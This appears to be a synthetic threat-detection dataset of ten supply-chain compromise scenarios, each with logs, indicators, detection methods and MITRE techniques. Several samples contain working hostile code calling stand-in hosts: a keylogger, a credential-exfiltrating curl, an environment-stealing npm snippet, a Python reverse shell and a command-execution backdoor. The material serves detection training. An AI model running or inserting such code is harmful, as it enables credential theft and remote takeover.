@@ -1,0 +1,289 @@
+{
+  "samples": [
+    {
+      "scenario": "A compromised container image published by a third-party vendor introduces a cryptomining malware that runs covertly within enterprise Kubernetes clusters.",
+      "technical_data": {
+        "dockerfile_snippet": "FROM alpine:3.12\nRUN apk add --no-cache curl\nADD miner.sh /usr/local/bin/miner.sh\nCMD [\"/bin/sh\", \"/usr/local/bin/miner.sh\"]",
+        "miner_sh_content": "#!/bin/sh\ncurl -s http://malicious.example.com/miner -o /tmp/miner\nchmod +x /tmp/miner\n/tmp/miner --url=stratum+tcp://pool.example.com:3333 --user=compromised-worker\n",
+        "container_image_hashes": {
+          "SHA256": "a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890"
+        },
+        "k8s_pod_logs": "[INFO] Starting miner with pool stratum+tcp://pool.example.com:3333\n[INFO] Connected to mining pool\n[WARN] High CPU usage detected",
+        "network_traffic": "10:22:11.345678 IP pod-xyz.namespace.svc.cluster.local.3333 > pool.example.com.3333: Flags [S], seq 123456, win 65535, length 0\n",
+        "process_tree": "sh (pid=101) -> miner.sh -> /tmp/miner",
+        "sbom_snippet": "{\n  \"name\": \"thirdparty-container\",\n  \"version\": \"5.4.1\",\n  \"components\": [\n    {\"type\": \"base_image\", \"name\": \"alpine\", \"version\": \"3.12\"}\n  ]\n}"
+      },
+      "indicators": [
+        "Container image with unknown added scripts not declared in vendor documentation",
+        "Unexpected high CPU usage in Kubernetes pods after image deployment",
+        "Network connections from pods to known cryptomining pool addresses",
+        "Process trees showing mining binaries executed inside containers",
+        "SBOM does not list cryptomining components despite presence in container"
+      ],
+      "detection_method": "Scan container images for unauthorized binaries; monitor resource usage patterns in Kubernetes clusters; inspect network traffic for mining pool protocols; validate SBOM against deployed container contents.",
+      "relevant_mitre_techniques": [
+        "T1195 - Supply Chain Compromise",
+        "T1059 - Command and Scripting Interpreter",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1496 - Resource Hijacking"
+      ]
+    },
+    {
+      "scenario": "A compromised software update package from a third-party analytics tool vendor contains a stealthy keylogger that captures user input and sends data to attacker-controlled servers.",
+      "technical_data": {
+        "update_package_hashes": {
+          "SHA256": "d7a8fbb307d7809469ca9abcb0082e4f8e2d6f9a4b9eb4c7c9e5d2c7b7a9d5f1"
+        },
+        "keylogger_code_snippet": "document.addEventListener('keydown', function(event) {\n    fetch('https://steal.example.com/keys', {\n        method: 'POST',\n        body: JSON.stringify({key: event.key, timestamp: Date.now()}),\n        headers: {'Content-Type': 'application/json'}\n    });\n});",
+        "network_traffic_log": "POST /keys HTTP/1.1\r\nHost: steal.example.com\r\nContent-Type: application/json\r\nContent-Length: 48\r\n\r\n{\"key\":\"a\",\"timestamp\":1686467800000}",
+        "application_log_entries": "2024-06-10T10:15:30Z INFO User input captured and sent to analytics endpoint\n",
+        "process_tree": "app.exe (pid=5678) -> analytics_module.dll -> event_listener -> fetch()",
+        "sbom_snippet": "{\n  \"name\": \"analytics-tool\",\n  \"version\": \"4.3.0\",\n  \"components\": [\n    {\"type\": \"library\", \"name\": \"event-listener\", \"version\": \"1.0.0\"}\n  ]\n}"
+      },
+      "indicators": [
+        "Unexpected network POST requests sending keystroke data to external domains",
+        "Update package hash does not match vendor published hash",
+        "Injected JavaScript event listeners capturing keyboard input",
+        "Application logs showing user input events sent over network",
+        "SBOM lacks modules that perform network input capture"
+      ],
+      "detection_method": "Perform hash verification on update packages; monitor application network calls for sensitive data transmissions; conduct static and dynamic analysis of update code; alert on suspicious event listeners sending data externally.",
+      "relevant_mitre_techniques": [
+        "T1195 - Supply Chain Compromise",
+        "T1056 - Input Capture",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.001 - Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Compromised build environment at a third-party software vendor injects a remote access trojan (RAT) into compiled binaries distributed to customers.",
+      "technical_data": {
+        "binary_file_hashes": {
+          "SHA256": "f1e2d3c4b5a6978877665544332211aabbccddeeff00112233445566778899aa"
+        },
+        "build_log_excerpt": "[INFO] Starting build process\n[WARN] Unexpected script executed: ./inject_rat.sh\n[INFO] Build completed with warnings",
+        "disassembled_binary_snippet": "0x00401000: push 0xdeadbeef\n0x00401005: call 0x00402000 ; RAT initialization\n0x00402000: socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\n0x00402010: connect(192.0.2.50:5555)\n",
+        "network_traffic_capture": "192.168.1.100:44444 > 192.0.2.50:5555 TCP SYN\n192.0.2.50:5555 > 192.168.1.100:44444 TCP SYN-ACK\n",
+        "process_creation_log": "2024-06-11T09:45:00Z app.exe created process rat_client.exe with args '-connect 192.0.2.50:5555'",
+        "sbom_snippet": "{\n  \"name\": \"enterprise-app\",\n  \"version\": \"7.0.0\",\n  \"components\": [\n    {\"type\": \"binary\", \"name\": \"app.exe\", \"version\": \"7.0.0\"}\n  ]\n}"
+      },
+      "indicators": [
+        "Build logs with unexpected script executions during compilation",
+        "Presence of unknown network connection routines in disassembled binaries",
+        "Outbound TCP connections from app binaries to unusual IP and ports",
+        "Process spawn of RAT client immediately after application start",
+        "SBOM hashes mismatch with vendor known good builds"
+      ],
+      "detection_method": "Audit build environments for unauthorized scripts; verify build logs for anomalies; perform static and dynamic binary analysis; monitor application network behavior; compare binary hashes against trusted builds.",
+      "relevant_mitre_techniques": [
+        "T1195 - Supply Chain Compromise",
+        "T1059 - Command and Scripting Interpreter",
+        "T1105 - Ingress Tool Transfer",
+        "T1071 - Application Layer Protocol",
+        "T1055 - Process Injection"
+      ]
+    },
+    {
+      "scenario": "Compromised third-party web analytics JavaScript library includes code that silently redirects users to phishing sites after loading legitimate scripts.",
+      "technical_data": {
+        "js_library_snippet": "function loadAnalytics() {\n  // Legitimate analytics code\n  ...\n}\n\n// Malicious redirect injected\nsetTimeout(function() {\n  window.location.href = 'https://phish.example.com/login';\n}, 5000);",
+        "cdn_file_hashes": {
+          "SHA256": "c0ffee1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
+        },
+        "browser_console_log": "Loading analytics.js\nRedirecting to https://phish.example.com/login in 5 seconds",
+        "network_http_request": "GET /login HTTP/1.1\r\nHost: phish.example.com\r\nUser-Agent: Mozilla/5.0",
+        "page_source_excerpt": "<script src=\"https://cdn.thirdparty.com/analytics.js\"></script>",
+        "sbom_snippet": "{\n  \"name\": \"thirdparty-analytics-js\",\n  \"version\": \"3.8.2\",\n  \"components\": []\n}"
+      },
+      "indicators": [
+        "Injected JavaScript performing unexpected redirects to phishing domains",
+        "Hash of CDN-hosted JS library differing from vendor published hash",
+        "Browser logs showing delayed redirect after script load",
+        "User reports of phishing pages immediately after visiting trusted sites",
+        "No legitimate components found in SBOM for redirect functionality"
+      ],
+      "detection_method": "Monitor hash integrity of third-party JS libraries; analyze browser console logs for unexpected redirects; audit web traffic to detect phishing domain visits; scan scripts for unauthorized code injections.",
+      "relevant_mitre_techniques": [
+        "T1195 - Supply Chain Compromise",
+        "T1566 - Phishing",
+        "T1059 - Command and Scripting Interpreter",
+        "T1071.001 - Web Protocols"
+      ]
+    },
+    {
+      "scenario": "A compromised firmware update from a third-party IoT device manufacturer contains code that disables security logging and opens a hidden administrative backdoor.",
+      "technical_data": {
+        "firmware_hashes": {
+          "SHA256": "abc123def4567890abc123def4567890abc123def4567890abc123def4567890"
+        },
+        "firmware_update_process_log": "2024-06-12T11:22:33Z Firmware version 10.5.3 received\n2024-06-12T11:22:34Z Hash verified\n2024-06-12T11:22:35Z Applying update\n2024-06-12T11:22:38Z Update applied\n",
+        "disassembled_code_snippet": "0x2000F00: MOV R2, #0x0 ; Disable syslog\n0x2000F04: STR R2, [0x40001000]\n0x2000F08: BL 0x3000A00 ; Enable hidden telnet backdoor\n",
+        "network_activity_log": "2024-06-12 11:23:00 Connection from 198.51.100.77:23 accepted\n",
+        "configuration_file_snippet": "telnetd_enable=1\nadmin_password=backdoor123\nlogging_enabled=0\n",
+        "process_creation_log": "2024-06-12T11:23:01Z telnetd process started with root privileges",
+        "device_model": "IoT-Cam Pro 2000"
+      },
+      "indicators": [
+        "Firmware hash mismatches with vendor official releases",
+        "Disassembly reveals instructions disabling system logging",
+        "Unexpected telnet server process running with elevated privileges",
+        "Network connections accepted on telnet port from unusual IPs",
+        "Configuration files contain hardcoded backdoor credentials"
+      ],
+      "detection_method": "Verify firmware hashes prior to update; analyze firmware disassembly for disabling security features; monitor device network services for unauthorized ports; audit configuration files and running services post-update.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Hardware Supply Chain",
+        "T1543 - Create or Modify System Process",
+        "T1005 - Data from Local System",
+        "T1071 - Application Layer Protocol"
+      ]
+    },
+    {
+      "scenario": "Compromise of a widely used CI/CD pipeline plugin by a third-party vendor, injecting malicious scripts that exfiltrate credentials during build processes.",
+      "technical_data": {
+        "plugin_config_diff": "diff --git a/.ci/config/plugins.yaml b/.ci/config/plugins.yaml\nindex 78a9fbc..9d7c4e1 100644\n--- a/.ci/config/plugins.yaml\n+++ b/.ci/config/plugins.yaml\n@@ -12,6 +12,15 @@ plugins:\n- name: build-notifier\n  version: 1.4.2\n+\n+  # Malicious credential exfiltration script added\n+  post_build_script: |\n+    #!/bin/bash\n+    curl -X POST -d \"user=$(cat /etc/ci/creds/user)\" -d \"token=$(cat /etc/ci/creds/token)\" http://evil.example.com/steal\n",
+        "sbom_snippet": "{\n  \"name\": \"ci-pipeline-plugin\",\n  \"version\": \"1.4.2\",\n  \"components\": [\n    {\n      \"type\": \"script\",\n      \"name\": \"post_build_script.sh\",\n      \"version\": \"1.0.0\",\n      \"hashes\": {\n        \"sha256\": \"4f8b6e7a2d3d5a9c9c4c3d1e8a7b5f6d2c1e4a3b7d9f8e6a5b4c3d2e1f0a9b7c\"\n      }\n    }\n  ]\n}",
+        "network_http_request": "POST /steal HTTP/1.1\r\nHost: evil.example.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\nuser=ci_user&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
+        "server_log_entry": "Jun 20 09:15:22 ci-server plugin[987]: Executed post_build_script.sh, credentials sent to evil.example.com",
+        "process_tree": "bash (pid=987) -> post_build_script.sh -> curl",
+        "hashes": {
+          "file": {
+            "SHA256": "4f8b6e7a2d3d5a9c9c4c3d1e8a7b5f6d2c1e4a3b7d9f8e6a5b4c3d2e1f0a9b7c"
+          }
+        }
+      },
+      "indicators": [
+        "Unexpected POST requests to external domains during CI/CD build",
+        "Malicious additions in plugin post_build_script",
+        "SBOM showing script component not in official vendor release",
+        "Process tree showing bash script invoking curl to unknown host",
+        "Server logs showing credential leak events"
+      ],
+      "detection_method": "Monitor network traffic from CI/CD servers for anomalous external HTTP requests; verify plugin SBOM against trusted vendor metadata; scan for unauthorized script changes in pipeline configurations; alert on process executions during build phase that connect externally.",
+      "relevant_mitre_techniques": [
+        "T1195 - Supply Chain Compromise",
+        "T1537 - Transfer Data to Cloud Account",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.001 - Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Backdoor introduced in a third-party container image used in production Kubernetes clusters, enabling remote command execution through a hidden API endpoint.",
+      "technical_data": {
+        "dockerfile_diff": "diff --git a/Dockerfile b/Dockerfile\nindex 2e3f4a5..8b9c0d1 100644\n--- a/Dockerfile\n+++ b/Dockerfile\n@@ -30,6 +30,14 @@ RUN npm install\n\n+# Inject hidden admin API endpoint\n+RUN echo \"\\napp.post('/admin/backdoor', (req, res) => {\\n  const { exec } = require('child_process');\\n  exec(req.body.cmd, (error, stdout, stderr) => {\\n    res.send(stdout || stderr);\\n  });\\n});\\n\" >> src/server.js\n",
+        "sbom_snippet": "{\n  \"name\": \"thirdparty-app\",\n  \"version\": \"5.6.0\",\n  \"components\": [\n    {\n      \"type\": \"container\",\n      \"name\": \"node\",\n      \"version\": \"14-alpine\",\n      \"hashes\": {\n        \"sha256\": \"d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5\"\n      }\n    }\n  ]\n}",
+        "network_http_request": "POST /admin/backdoor HTTP/1.1\r\nHost: cluster-service.internal\r\nContent-Type: application/json\r\nContent-Length: 23\r\n\r\n{\"cmd\": \"id\"}\r\n",
+        "server_log_entry": "Jun 18 11:05:45 k8s-node app[2345]: Received POST /admin/backdoor with command execution request",
+        "process_tree": "node (pid=2345) -> server.js -> child_process.exec()",
+        "hashes": {
+          "file": {
+            "SHA256": "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5"
+          }
+        }
+      },
+      "indicators": [
+        "Unexpected POST requests to hidden /admin/backdoor API endpoint",
+        "Dockerfile modifications adding command execution API",
+        "SBOM container image hashes not matching vendor published images",
+        "Process tree showing server executing shell commands from API input",
+        "Server logs recording suspicious command execution requests"
+      ],
+      "detection_method": "Audit container images against trusted SBOMs; monitor API endpoints for undocumented routes; detect abnormal POST requests to internal services; log and alert on process executions initiated by network requests; perform regular container image vulnerability scans.",
+      "relevant_mitre_techniques": [
+        "T1195 - Supply Chain Compromise",
+        "T1203 - Exploitation for Client Execution",
+        "T1059 - Command and Scripting Interpreter",
+        "T1071.001 - Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Injection of malicious npm package dependency by compromised third-party maintainer, which steals environment variables and sends them to attacker-controlled domain during package initialization.",
+      "technical_data": {
+        "package_json_diff": "diff --git a/package.json b/package.json\nindex 4e5f6a7..8c9d0e1 100644\n--- a/package.json\n+++ b/package.json\n@@ -10,6 +10,10 @@\n \"dependencies\": {\n-    \"lodash\": \"^4.17.21\"\n+    \"lodash\": \"^4.17.21\",\n+    \"malicious-lib\": \"1.0.0\"\n },\n+\n+// malicious-lib index.js snippet\n+const http = require('http');\n+const envData = process.env;\n+http.get('http://malicious.example.net/collect?env=' + encodeURIComponent(JSON.stringify(envData)));\n",
+        "sbom_snippet": "{\n  \"name\": \"app-project\",\n  \"version\": \"3.0.0\",\n  \"components\": [\n    {\n      \"type\": \"library\",\n      \"name\": \"malicious-lib\",\n      \"version\": \"1.0.0\",\n      \"hashes\": {\n        \"sha256\": \"9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b\"\n      }\n    }\n  ]\n}",
+        "network_http_request": "GET /collect?env=%7B%22PATH%22%3A%22/usr/bin%22%2C%22API_KEY%22%3A%22secret123%22%7D HTTP/1.1\r\nHost: malicious.example.net\r\nUser-Agent: nodejs-http-client/1.0\r\nConnection: close\r\n\r\n",
+        "server_log_entry": "Jun 22 16:45:11 app-server nodejs: Outbound HTTP GET to malicious.example.net with environment variables in query string",
+        "process_tree": "node (pid=5678) -> malicious-lib index.js -> http.get()",
+        "hashes": {
+          "file": {
+            "SHA256": "9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b"
+          }
+        }
+      },
+      "indicators": [
+        "Unexpected new npm dependency 'malicious-lib' in package.json",
+        "Outbound HTTP requests leaking environment variables",
+        "SBOM showing unknown library not in vendor manifests",
+        "Process tree showing malicious-lib making network calls",
+        "Server logs indicating environment data sent externally"
+      ],
+      "detection_method": "Validate third-party dependencies before inclusion; monitor environment variable exposure; analyze network traffic for suspicious external connections; verify SBOMs against trusted sources; alert on installation of unknown or new libraries.",
+      "relevant_mitre_techniques": [
+        "T1195 - Supply Chain Compromise",
+        "T1083 - File and Directory Discovery",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.001 - Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Malicious modification of a trusted Python package distributed via PyPI by a compromised maintainer, adding a timer-triggered reverse shell backdoor executed on import.",
+      "technical_data": {
+        "setup_py_diff": "diff --git a/setup.py b/setup.py\nindex 123abcd..456efgh 100644\n--- a/setup.py\n+++ b/setup.py\n@@ -25,6 +25,15 @@ setup(\n     name='trustedlib',\n     version='1.2.3',\n+\n+import threading\n+import socket\n+import subprocess\n+\n+def backdoor():\n+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n+    s.connect(('badactor.example.org', 5555))\n+    while True:\n+        cmd = s.recv(1024).decode('utf-8')\n+        if cmd == 'exit': break\n+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n+        out, err = proc.communicate()\n+        s.send(out + err)\n+\n+threading.Timer(10.0, backdoor).start()\n)",
+        "sbom_snippet": "{\n  \"name\": \"trustedlib\",\n  \"version\": \"1.2.3\",\n  \"components\": [\n    {\n      \"type\": \"package\",\n      \"name\": \"trustedlib\",\n      \"version\": \"1.2.3\",\n      \"hashes\": {\n        \"sha256\": \"abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890\"\n      }\n    }\n  ]\n}",
+        "network_c2_traffic": "10:05:12.345678 IP victim-host.56789 > badactor.example.org.5555: Flags [S], seq 0, win 65535, options [mss 1460], length 0\n10:05:12.345790 IP badactor.example.org.5555 > victim-host.56789: Flags [S.], seq 0, ack 1, win 65535, length 0\n",
+        "process_creation_log": "2024-06-23T10:05:22Z USER: Python process spawned socket connection to badactor.example.org:5555",
+        "hashes": {
+          "file": {
+            "SHA256": "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
+          }
+        }
+      },
+      "indicators": [
+        "Setup.py modified to add timer-triggered reverse shell function",
+        "Unexpected outbound TCP connection to suspicious external IP and port",
+        "SBOM hash mismatch with trusted package releases",
+        "Process logs showing Python process initiating network connection",
+        "Threading timer starting backdoor shortly after import"
+      ],
+      "detection_method": "Compare package hashes with official PyPI distributions; monitor network connections from Python interpreters; scan setup.py and package entrypoints for suspicious code; alert on new outbound connections shortly after package import; audit third-party package maintainers.",
+      "relevant_mitre_techniques": [
+        "T1195 - Supply Chain Compromise",
+        "T1059.004 - Command and Scripting Interpreter: Python",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071 - Application Layer Protocol"
+      ]
+    },
+    {
+      "scenario": "Compromise of a popular Linux distribution mirror causing a trusted system update package to include a trojanized systemd unit file enabling persistent remote access.",
+      "technical_data": {
+        "systemd_unit_diff": "diff --git a/etc/systemd/system/cron.service b/etc/systemd/system/cron.service\nindex 7e8f9a0..c1d2e3f 100644\n--- a/etc/systemd/system/cron.service\n+++ b/etc/systemd/system/cron.service\n@@ -1,9 +1,14 @@\n [Unit]\n Description=Regular cron job runner\n-\n+[Service]\n+ExecStart=/usr/sbin/cron\n+\n+# Malicious override to start backdoor\n+ExecStartPost=/usr/local/bin/.hidden_backdoor\n+Restart=always\n+\n [Install]\n WantedBy=multi-user.target\n",
+        "package_hashes": {
+          "SHA256": "c0ffeeaabbccddeeff00112233445566778899aabbccddeeff00112233445566"
+        },
+        "update_log": "2024-06-21T03:15:10Z apt[1234]: Installed package cron v3.0.0 from mirror.example.com\n2024-06-21T03:15:11Z systemd[1]: cron.service started\n2024-06-21T03:15:12Z systemd[1]: Executing /usr/local/bin/.hidden_backdoor\n",
+        "network_c2_traffic": "03:15:13.123456 IP host1.34567 > attacker.example.com.8080: Flags [S], seq 0, win 65535, length 0\n03:15:13.123789 IP attacker.example.com.8080 > host1.34567: Flags [S.], seq 0, ack 1, win 65535, length 0",
+        "file_system_artifacts": "/usr/local/bin/.hidden_backdoor (executable with suspicious network connections)",
+        "process_tree": "systemd (pid=1) -> cron.service -> .hidden_backdoor",
+        "hashes": {
+          "file": {
+            "SHA256": "c0ffeeaabbccddeeff00112233445566778899aabbccddeeff00112233445566"
+          }
+        }
+      },
+      "indicators": [
+        "Trojanized systemd service unit including ExecStartPost launching hidden executable",
+        "Package hash mismatch for cron package from mirror",
+        "Outbound TCP connection to attacker-controlled server immediately after cron start",
+        "Presence of suspicious hidden executable in /usr/local/bin",
+        "Process tree linking systemd cron service to backdoor process"
+      ],
+      "detection_method": "Verify package integrity and signatures from trusted mirrors; monitor systemd unit files for unauthorized changes; alert on unexpected ExecStartPost directives; track network connections from system services; perform file system integrity monitoring for hidden executables.",
+      "relevant_mitre_techniques": [
+        "T1195 - Supply Chain Compromise",
+        "T1543 - Create or Modify System Process",
+        "T1071 - Application Layer Protocol",
+        "T1041 - Exfiltration Over C2 Channel"
+      ]
+    }
+  ]
+}
